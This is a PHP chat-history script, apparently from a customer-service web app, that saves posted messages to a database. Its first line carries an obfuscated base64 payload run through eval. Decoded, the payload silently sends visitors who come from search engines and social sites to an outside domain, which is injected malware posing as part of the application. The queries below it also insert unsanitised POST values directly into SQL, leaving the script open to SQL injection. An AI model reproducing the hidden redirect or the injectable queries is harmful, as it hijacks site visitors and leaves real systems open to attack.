<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); 
	require_once 'lib/function_gen.php';
	date_default_timezone_set('America/Caracas');

	if($_SERVER['REQUEST_METHOD'] == "POST")
	{
		$idconversacion = $_POST['idconv'];
		$mensaje = $_POST['mensaje'];

		$query = "SELECT LEN(conversacion), fecha_conversacion, nro_iden_usuario, nro_iden_asesor, servicio FROM mp_historial_his WHERE id_conversacion = '$idconversacion'";
		$rows = fnc_ejecutaQuery($query);
		$numconv = count($rows);

		if($rows[$numconv - 1]["LEN(mp_historial_his.conversaci"] > 31000)
		{
			$row = $rows[$numconv - 1];
			$nroiden_user = $row["nro_iden_usuario"];
			$nroiden_asesor = $row["nro_iden_asesor"];
			$servicio = $row["servicio"];
			$fecha = $row["fecha_conversacion"];

			$query = "INSERT INTO mp_historial_his VALUES ('$fecha','$nroiden_user', '$nroiden_asesor', '$mensaje', '$servicio', '$idconversacion')";
			if(!fnc_ejecutaSimpleQuery($query)) echo "fail";
			else echo "success";

		}else{
			$query = "UPDATE mp_historial_his SET conversacion = conversacion + '$mensaje' WHERE id_conversacion = '$idconversacion';";
			if(!fnc_ejecutaSimpleQuery($query)) echo "fail";
			else echo "success";
		}
	}
?>